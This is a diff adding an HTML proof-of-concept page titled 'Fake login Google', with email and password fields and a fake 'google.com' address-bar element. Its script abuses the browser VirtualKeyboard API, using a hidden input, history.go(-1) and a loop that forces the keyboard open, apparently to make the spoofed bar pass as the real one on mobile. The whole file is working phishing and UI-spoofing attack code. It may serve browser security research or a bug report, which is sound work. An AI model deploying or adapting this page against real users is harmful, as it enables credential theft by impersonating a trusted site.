@@ -1,0 +1,46 @@
+
+
+<body onload="">
+
+
+<button style="opacity:0" id="edit-button">Go to Google</button> 
+
+<div>Fake login Google</div>
+<div><label>Email:</label><input type="text"></div>
+
+<div><label>Password:</label><input type="text"></div>
+
+<div><button>Login</button></div>
+<input style="opacity:0"  name="browser" virtualkeyboardpolicy="manual" id="browser">
+
+ <div id="fake" style="background-color:white;font-size:xx-large;border-style: solid;opacity:1;margin-top:88%">
+
+     <label style="margin-left: 40%;">google.com</label>
+   </div>
+</body>
+<script>
+
+if ("virtualKeyboard" in navigator) {
+  const editor = document.getElementById("browser");
+   const editButton = document.getElementById("edit-button"); 
+ let isEditing = false; 
+
+  editButton.addEventListener("click", () => {
+    if (isEditing) {
+      navigator.virtualKeyboard.hide();
+      //editButton.textContent = "Edit";
+    } else {
+      editor.focus();
+      editor.click();
+    
+      setTimeout('history.go(-1);',350);
+      
+      setInterval('navigator.virtualKeyboard.show();',1)
+
+    }
+
+    isEditing = !isEditing;
+  });
+}
+
+</script>
